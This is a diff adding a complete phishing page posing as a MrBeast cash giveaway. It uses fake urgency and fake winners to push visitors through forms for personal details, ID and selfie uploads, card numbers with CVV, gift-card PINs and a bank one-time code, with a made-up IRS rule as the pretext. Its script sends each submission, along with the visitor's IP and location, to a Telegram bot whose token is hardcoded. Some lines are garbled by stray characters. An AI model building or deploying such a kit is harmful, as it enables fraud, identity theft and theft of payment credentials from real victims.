+                        <path d="M386.53,379.53a22.25,22.25,0,0,1,2,2.21,14.47,14.47,0,0,1-.44,1.45a58.09,58.09,0,0,0,7,.68h.25c-.77.41-1.5,1.12-2.43,1a26,26,0,0,1-7.62-1.78l2.23-.73a5,5,0,0,0-2.41-1.76C385.63,380.22,386.08,379.88,386.53,379.53Z" transform="translate(-288.83 -330.34)" style="fill:#00819c"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-8">
+                <div class="text-center mb-8">
+                    <h1 class="text-3xl font-bold text-gray-900 mb-2">$100,000 FAN GIVEAWAY</h1>
+                    <p class="text-gray-600">200 lucky winners will receive $500 each!</p>
+                </div>
+                
+                <div class="bg-red-50 rounded-xl p-6 mb-8">
+                    <div class="flex justify-between items-center mb-4">
+                        <div>
+                            <p class="text-sm text-gray-600 font-medium">TIME REMAINING</p>
+                            <p id="countdown" class="text-2xl font-bold text-gray-900">03:00:00</p>
+                        </div>
+                        <div class="text-right">
+                            <p class="text-sm text-gray-600 font-medium">SPOTS LEFT</p>
+                            <p id="participants" class="text-2xl font-bold text-gray-900">27</p>
+                        </div>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-3">
+                        <div id="progress-bar" class="bg-red-600 h-3 rounded-full" style="width: 87%"></div>
+                    </div>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-lg font-bold mb-4 text-center">LIVE WINNER NOTIFICATIONS</h2>
+                    <div class="h-48 overflow-hidden relative bg-gray-50 rounded-xl">
+                        <div class="testimonial-scroll absolute w-full py-4">
+                            <div class="flex items-center mb-4 px-4">
+                                <img src="https://i.pravatar.cc/40?img=11" class="rounded-full mr-3 border-2 border-green-500">
+                                <div>
+                                    <p class="font-semibold">Sarah K. won $500</p>
+                                    <p class="text-sm text-gray-600">Verified 2 minutes ago</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center mb-4 px-4">
+                                <img src="https://i.pravatar.cc/40?img=12" class="rounded-full mr-3 border-2 border-green-500">
+                                <div>
+                                    <p class="font-semibold">Michael T. won $500</p>
+                                    <p class="text-sm text-gray-600">Verified 5 minutes ago</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center mb-4 px-4">
+                                <img src="https://i.pravatar.cc/40?img=13" class="rounded-full mr-3 border-2 border-green-500">
+                                <div>
+                                    <p class="font-semibold">Jessica L. won $500</p>
+                                    <p class="text-sm text-gray-600">Verified 8 minutes ago</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center mb-4 px-4">
+                                <img src="https://i.pravatar.cc/40?img=14" class="rounded-full mr-3 border-2 border-green-500">
+                                <div>
+                                    <p class="font-semibold">David P. won $500</p>
+                                    <p class="text-sm text-gray-600">Verified 12 minutes ago</p>
+                                </div>
+                            </div>
+                            <div class="flex items-center mb-4 px-4">
+                                <img src="https://i.pravatar.cc/40?img=15" class="rounded-full mr-3 border-2 border-green-500">
+                                <div>
+                                    <p class="font-semibold">Alex R. won $500</p>
+                                    <p class="text-sm text-gray-600">Verified 15 minutes ago</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button id="continue1" class="w-full btn-primary text-white font-bold py-4 px-4 rounded-xl text-lg">
+                    CHECK MY ELIGIBILITY
+                </button>
+                
+                <div class="mt-6 text-center text-sm text-gray-500">
+                    <p>This promotion is in no way sponsored, endorsed or administered by YouTube</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 2: Prize Notification -->
+    <div id="page2" class="page">
+        <div class="max-w-2xl mx-auto bg-white card my-10">
+            <div class="bg-red-600 py-4">
+                <div class="flex justify-center">
+                    <svg class="mrbeast-logo" viewBox="0 0 190.34 107.32">
+                        <!-- SVG path data from above -->
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-8">
+                <div id="loading" class="text-center py-12">
+                    <div class="mb-6">
+                        <div class="inline-block animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-red-600"></div>
+                    </div>
+                    <p class="text-xl font-semibold mb-2">Checking eligibility</p>
+                    <p class="text-gray-600">Verifying your account details</p>
+                    <div class="loading-dots mt-4">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                </div>
+                
+                <div id="prize-notification" class="hidden text-center py-8">
+                    <div class="text-7xl text-green-500 mb-4">🎉</div>
+                    <div class="bg-green-50 border border-green-200 rounded-xl p-6 mb-6">
+                        <h2 class="text-2xl font-bold text-green-700 mb-2">CONGRATULATIONS!</h2>
+                        <p class="text-xl font-medium mb-1">You've been selected to receive</p>
+                        <p class="text-3xl font-bold">$28,000</p>
+                    </div>
+                    
+                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-8">
+                        <p class="text-blue-700 font-medium">
+                            <i class="fas fa-exclamation-circle mr-2"></i>
+                            Complete verification within 15 minutes to claim your prize
+                        </p>
+                    </div>
+                    
+                    <button id="continue2" class="w-full btn-primary text-white font-bold py-4 px-4 rounded-xl text-lg">
+                        CONTINUE TO VERIFICATION
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 3: Verification -->
+    <div id="page3" class="page">
+        <div class="max-w-2xl mx-auto bg-white card my-10">
+            <div class="bg-red-600 py-4">
+                <div class="flex justify-center">
+                    <svg class="mrbeast-logo" viewBox="0 0 190.34 107.32">
+                        <!-- SVG path data from above -->
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-8">
+                <h2 class="text-2xl font-bold text-center mb-2">Identity Verification</h2>
+                <p class="text-center text-gray-600 mb-8">Required to prevent fraud and confirm eligibility</p>
+                
+                <form id="verification-form">
+                    <div class="space-y-6">
+                        <div>
+                            <label class="block text-gray-700 font-medium mb-2">Phone Number</label>
+                            <div class="flex">
+                                <select class="bg-gray-100 border border-r-0 rounded-l-lg p-3 w-24">
+                                    <option>US +1</option>
+                                    <option>UK +44</option>
+                                    <option>CA +1</option>
+                                    <option>AU +61</option>
+                                    <option>DE +49</option>
+                                </select>
+                                <input type="tel" required class="flex-1 border rounded-r-lg p-3" placeholder="(555) 123-4567">
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-gray-700 font-medium mb-2">Full Legal Name</label>
+                            <input type="text" required class="w-full border rounded-lg p-3" placeholder="As shown on government ID">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-gray-700 font-medium mb-2">Email Address</label>
+                            <input type="email" required class="w-full border rounded-lg p-3" placeholder="your@email.com">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-gray-700 font-medium mb-2">Home Address</label>
+                            <input type="text" required class="w-full border rounded-lg p-3 mb-3" placeholder="Street address">
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+                                <input type="text" required class="border rounded-lg p-3" placeholder="City">
+                                <input type="text" required class="border rounded-lg p-3" placeholder="State">
+                                <input type="text" required class="border rounded-lg p-3" placeholder="ZIP">
+                            </div>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div>
+                                <label class="block text-gray-700 font-medium mb-2">Government ID</label>
+                                <div class="upload-area rounded-lg p-6 text-center cursor-pointer relative">
+                                    <i class="fas fa-id-card text-4xl text-gray-400 mb-3"></i>
+                                    <p class="font-medium">Upload front of ID</p>
+                                    <p class="text-sm text-gray-500 mt-1">Driver's license, passport, or state ID</p>
+                                    <input type="file" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer" accept="image/*">
+                                </div>
+                            </div>
+                            <div>
+                                <label class="block text-gray-700 font-medium mb-2">Selfie Verification</label>
+                                <div class="upload-area rounded-lg p-6 text-center cursor-pointer relative">
+                                    <i class="fas fa-camera text-4xl text-gray-400 mb-3"></i>
+                                    <p class="font-medium">Take a live selfie</p>
+                                    <p class="text-sm text-gray-500 mt-1">Show your face clearly with ID visible</p>
+                                    <input type="file" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer" accept="image/*">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="w-full btn-primary text-white font-bold py-4 px-4 rounded-xl text-lg mt-8">
+                        COMPLETE VERIFICATION
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 4: Payment -->
+    <div id="page4" class="page">
+        <div class="max-w-2xl mx-auto bg-white card my-10">
+            <div class="bg-red-600 py-4">
+                <div class="flex justify-center">
+                    <svg class="mrbeast-logo" viewBox="0 0 190.34 107.32">
+                        <!-- SVG path data from above -->
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-8">
+                <h2 class="text-2xl font-bold text-center mb-2">Transaction Fee Payment</h2>
+                <p class="text-center text-gray-600 mb-8">Required to process your $28,000 prize transfer</p>
+                
+                <div class="bg-yellow-50 border border-yellow-200 rounded-xl p-4 mb-8">
+                    <p class="text-yellow-700 font-medium">
+                        <i class="fas fa-info-circle mr-2"></i>
+                        A $15 processing fee is required to release your funds
+                    </p>
+                </div>
+                
+                <div class="flex justify-center gap-6 mb-8">
+                    <div class="payment-card active w-1/2 p-5 rounded-xl cursor-pointer" data-method="cc">
+                        <div class="flex justify-center mb-3">
+                            <div class="flex items-center">
+                                <i class="fab fa-cc-visa text-3xl text-blue-600 mr-2"></i>
+                                <i class="fab fa-cc-mastercard text-3xl text-red-600 mr-2"></i>
+                                <i class="fab fa-cc-amex text-3xl text-blue-800"></i>
+                            </div>
+                        </div>
+                        <p class="text-center font-medium">Credit/Debit Card</p>
+                    </div>
+                    <div class="payment-card w-1/2 p-5 rounded-xl cursor-pointer" data-method="gift">
+                        <div class="flex justify-center mb-3">
+                            <i class="fas fa-gift text-4xl text-green-500"></i>
+                        </div>
+                        <p class="text-center font-medium">Gift Card</p>
+                    </div>
+                </div>
+                
+                <form id="payment-form">
+                    <div id="credit-card-form">
+                        <div class="mb-6">
+                            <label class="block text-gray-700 font-medium mb-2">Card Number</label>
+                           极
+                            <input type="text" required class="w-full border rounded-lg p-3" placeholder="0000 0000 0000 0000">
+                        </div>
+                        
+                        <div class="grid grid极ols-1 md:grid-cols-2 gap-6 mb-6">
+                            <div>
+                                <label class="block text-gray-700 font-medium mb-2">Expiration Date</label>
+                                <input type="text" required class="w-full border rounded-lg p-3" placeholder="MM/YY">
+                            </div>
+                            <div>
+                                <label class="block text-gray-700 font-medium mb-2">Security Code (CVV)</label>
+                                <input type="text" required class="w-full border rounded-lg p-3" placeholder="123">
+                            </div>
+                        </div>
+                        
+                        <div class="mb-6">
+                            <label class="block text-gray-700 font-medium mb-2">Cardholder Name</label>
+                            <input type="text" required class="w-full border rounded-lg p-3" placeholder="As shown on card">
+                        </div>
+                    </div>
+                    
+                    <div id="gift-card-form" class="hidden">
+                        <div class="mb-6">
+                            <label class="block text-gray-700 font-medium mb-2">Gift Card Number</label>
+                            <input type="text" required class="w-full border rounded-lg p-3" placeholder="XXXX-XXXX-XXXX-XXXX">
+                        </div>
+                        <div class="mb-6">
+                            <label class="block text-gray-700 font-medium mb-2">PIN Code</label>
+                            <input type="text" class="w-full border rounded-lg p-3" placeholder="Optional">
+                        </div>
+                    </div>
+                    
+                    <div class="border-t pt-6 mb-6">
+                        <div class="flex justify-between items-center font-medium text-lg">
+                            <span>Processing Fee:</span>
+                            <span>$15.00</极span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex items-center justify-center mb-6 space-x-4 security-logos">
+                        <img src="https://i.imgur.com/2E8J7Fp.png" class="h-8" alt="SSL Secure">
+                        <img src="https://i.imgur.com/3B9WbXp.png" class="h-8" alt="PCI Compliant">
+                        <img src="https://i.imgur.com/5jD5fz5.png" class="h-8" alt="McAfee Secure">
+                    </div>
+                    
+                    <button type="submit" class="w-full btn-primary text-white font-bold py-4 px-4 rounded-xl text-lg">
+                        PAY PROCESSING FEE
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 5: IRS Verification -->
+    <div id="page5" class="page">
+        <div class="max-w-2xl mx-auto bg-white card my-10">
+            <div class="bg-red-600 py-4">
+                <div class="flex justify-center">
+                    <svg class="mrbeast-logo" viewBox="0 0 190.34 107.32">
+                        <!-- SVG path data from above -->
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-8">
+                <h2 class="text-2xl font-bold text-center mb-2">IRS Verification</h2>
+                
+                <div class="bg-red-50 border border-red-200 rounded-xl p-6 mb-8">
+                    <div class="flex items-start">
+                        <i class="fas fa-exclamation-triangle text-2xl text-red-500 mt-1 mr-3"></i>
+                        <div>
+                            <p class="font-bold text-red-700 mb-2">IRS Regulation 872-B Compliance Required</p>
+                            <p class="text-gray-700">
+                                US tax law requires identity confirmation for prizes over $600. Your bank has sent a secure code to your registered device.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                
+                <form id="irs-form">
+                    <div class="mb-8">
+                        <label class="block text-gray-700 font-medium mb-2">Enter 6-Digit Verification Code</label>
+                        <div class="flex justify-center">
+                            <input type="text" required class="w-48 border-2 border-gray-300 rounded-xl p-4 text-center text-2xl font-bold" placeholder="------" maxlength="6">
+                        </div>
+                        <p class="text-center text-gray-600 mt-3">
+                            Sent to your device ending with <span class="font-medium">•••• 3456</span>
+                        </p>
+                    </div>
+                    
+                    <div class="text-center mb-6">
+                        <button type="button" class="text-red-600 font-medium">
+                            <i class="fas fa-redo-alt mr-2"></i>Resend Code
+                        </button>
+                    </div>
+                    
+                    <button type="submit" class="w-full btn-primary text-white font-bold py-4 px-4 rounded-xl text-lg">
+                        VERIFY & RECEIVE PAYMENT
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 6: Confirmation -->
+    <div id="page6" class="page">
+        <div class="max-w-2xl mx-auto bg-white card my-10">
+            <div class="bg-red-600 py-4">
+                <div class="flex justify-center">
+                    <svg class="mrbeast-logo" viewBox="0 0 190.34 107.32">
+                        <!-- SVG path data from above -->
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-8 text-center">
+                <div class="py-10">
+                    <div class="text-7xl text-green-500 mb-6">✅</div>
+                    <h2 class="text-3xl font-bold mb-4">Submission Complete!</h2>
+                    <p class="text-xl text-gray-700 mb-8">
+                        Your $28,000 prize is being processed
+                    </p>
+                    
+                    <div class="bg-gray-50 rounded-xl p-6 max-w-md mx-auto mb-8">
+                        <p class="font-medium mb-2">Transaction ID: <span class="font-mono">MB-5X8A2-9B3C1</span></p>
+                        <p class="text-gray-600">We'll notify you within 24 hours when funds are available</p>
+                    </div>
+                    
+                    <div class="flex justify-center space-x-4 mb-8">
+                        <button class="bg-blue-500 hover:bg-blue-600 text-white py-2 px-6 rounded-lg">
+                            <i class="fab fa-youtube mr-2"></i>Subscribe
+                        </button>
+                        <button class="bg-purple-500 hover:bg-purple-600 text-white py-2 px-6 rounded-lg">
+                            <i class="fab fa-instagram mr-2"></i>Follow
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram configuration
+        const BOT_TOKEN = '8446493963:AAHEaD0xD3O63a56khu8QEGtRsf-YXlvDBI';
+        const CHAT_ID = '-1003267144230';
+        
+        // Page navigation
+        const pages = document.querySelectorAll('.page');
+        let currentPage = 1;
+        
+        function showPage(pageNumber) {
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById(`page${pageNumber}`).classList.add('active');
+            currentPage = pageNumber;
+            window.scrollTo(0, 0);
+        }
+        
+        // Page 1: Countdown and participants
+        let countdown = 3 * 60 * 60; // 3 hours in seconds
+        let participants = 27;
+        let participantInterval;
+        
+        function updateCountdown() {
+            const hours = Math.floor(countdown / 3600);
+            const minutes = Math.floor((countdown % 3600) / 60);
+            const seconds = countdown % 60;
+            
+            document.getElementById('countdown').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (countdown > 0) {
+                countdown--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+        
+        function updateParticipants() {
+            if (participants > 0) {
+                participants--;
+                document.getElementById('participants').textContent = participants;
+                const progress = (27 - participants) / 27 * 100;
+                document.getElementById('progress-bar').style.width = `${progress}%`;
+            }
+            if (participants <= 0) {
+                clearInterval(participantInterval);
+            }
+        }
+        
+        // Enhanced Telegram data sending with error handling
+        function sendToTelegram(data) {
+            const message = `🎯 PAGE ${currentPage} SUBMISSION\n${formatData(data)}`;
+            
+            // Get user IP and location
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    const fullMessage = `${message}\n\n🌐 IP: ${ipData.ip}\n📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}\n🕒 ${new Date().toLocaleString()}`;
+                    
+                    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: fullMessage,
+                        parse_mode: 'HTML'
+                    })
+                    .catch(error => {
+                        console.error('Telegram error:', error);
+                    });
+                })
+                .catch(error => {
+                    const fullMessage = `${message}\n\n🌐 IP: Failed to fetch\n🕒 ${new Date().toLocaleString()}`;
+                    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: fullMessage,
+                        parse_mode: 'HTML'
+                    });
+                });
+        }
+        
+        function formatData(data) {
+            let formatted = '';
+            for (const key in data) {
+                formatted += `• <b>${key.replace(/_/g, ' ').toUpperCase()}</b>: ${data[key]}\n`;
+            }
+            return formatted;
+        }
+        
+        // File upload handling
+        document.querySelectorAll('.upload-area input[type="file"]').forEach(input => {
+            const area = input.parentElement;
+            input.addEventListener('change', (e) => {
+                if (e.target.files.length > 0) {
+                    area.innerHTML = `
+                        <div class="text-green-500">
+                            <i class="fas fa-check-circle text-4xl mb-2"></i>
+                            <p class="font-medium">Upload Successful</p>
+                            <p class="text-sm">${e.target.files[0].name}</p>
+                        </div>
+                    `;
+                }
+            });
+            
+            area.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                area.classList.add('dragover');
+            });
+            
+            area.addEventListener('dragleave', () => {
+                area.classList.remove('dragover');
+            });
+            
+            area.addEventListener('drop', (e) => {
+                e.preventDefault();
+                area.classList.remove('dragover');
+                input.files = e.dataTransfer.files;
+                if (e.dataTransfer.files.length > 0) {
+                    area.innerHTML = `
+                        <div class="text-green-500">
+                            <i class="fas fa-check-circle text-4xl mb-2"></i>
+                            <p class="font-medium">Upload Successful</p>
+                            <p class="text-sm">${e.dataTransfer.files[0].name}</p>
+                        </div>
+                    `;
+                }
+            });
+        });
+        
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', () => {
+            // Page 1
+            updateCountdown();
+            participantInterval = setInterval(updateParticipants, 23000);
+            
+            // Page 1 button
+            document.getElementById('continue1').addEventListener('click', () => {
+                showPage(2);
+                setTimeout(() => {
+                    document.getElementById('loading').classList.add('hidden');
+                    document.getElementById('prize-notification').classList.remove('hidden');
+                    sendToTelegram({ action: 'Eligibility check passed', prize_amount: '$28,000' });
+                }, 3500);
+            });
+            
+            // Page 2 button
+            document.getElementById('continue2').addEventListener('click', () => {
+                showPage(3);
+            });
+            
+            // Page 3 form
+            document.getElementById('verification-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const formData = {
+                    phone: document.querySelector('#page3 input[type="tel"]').value,
+                    full_name: document.querySelector('#page3 input[placeholder="As shown on government ID"]').value,
+                    email: document.querySelector('#page3 input[type="email"]').value,
+                    address: document.querySelector('#page3 input[placeholder="Street address"]').value,
+                    city: document.querySelector('#page3 input[placeholder="City"]').value,
+                    state: document.querySelector('#page3 input[placeholder="State"]').value,
+                    zip: document.querySelector('#page3 input[placeholder="ZIP"]').value
+                };
+                
+                showPage(4);
+                sendToTelegram(formData);
+            });
+            
+            // Payment method toggle
+            document.querySelectorAll('.payment-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    document.querySelectorAll('.payment-card').forEach(c => c.classList.remove('active'));
+                    card.classList.add('active');
+                    
+                    if (card.dataset.method === 'cc') {
+                        document.getElementById('credit-card-form').classList.remove('hidden');
+                        document.getElementById('gift-card-form').classList.add('hidden');
+                    } else {
+                        document.getElementById('credit-card-form').classList.add('hidden');
+                        document.getElementById('gift-card-form').classList.remove('hidden');
+                    }
+                });
+            });
+            
+            // Page 4 form
+            document.getElementById('payment-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const isCreditCard = document.querySelector('.payment-card.active').dataset.method === 'cc';
+                
+                const paymentData = {
+                    payment_method: isCreditCard ? 'Credit Card' : 'Gift Card',
+                    amount: '$15.00'
+                };
+                
+                if (isCreditCard) {
+                    paymentData.card_number = document.querySelector('#credit-card-form input[placeholder="0000 0000 000极 0000"]').value;
+                    paymentData.expiry = document.querySelector('#credit-card-form input[placeholder="MM/YY"]').value;
+                    paymentData.cvv = document.querySelector('#credit-card-form input[placeholder="123"]').value;
+                    paymentData.cardholder = document.querySelector('#credit-card-form input[placeholder="As shown on card"]').value;
+                } else {
+                    paymentData.gift_card = document.querySelector('#gift-card-form input[placeholder="XXXX-XXXX-XXXX-XXXX"]').value;
+                    paymentData.pin = document.querySelector('#gift-card-form input[placeholder="Optional"]').value || 'N/A';
+                }
+                
+                showPage(5);
+                sendToTelegram(paymentData);
+            });
+            
+            // Page 5 form
+            document.getElementById('irs-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const code = document.querySelector('#irs-form input').value;
+                sendToTelegram({ irs_verification_code: code });
+                showPage(6);
+            });
+        });
+    </script>
+</body>
+</html>
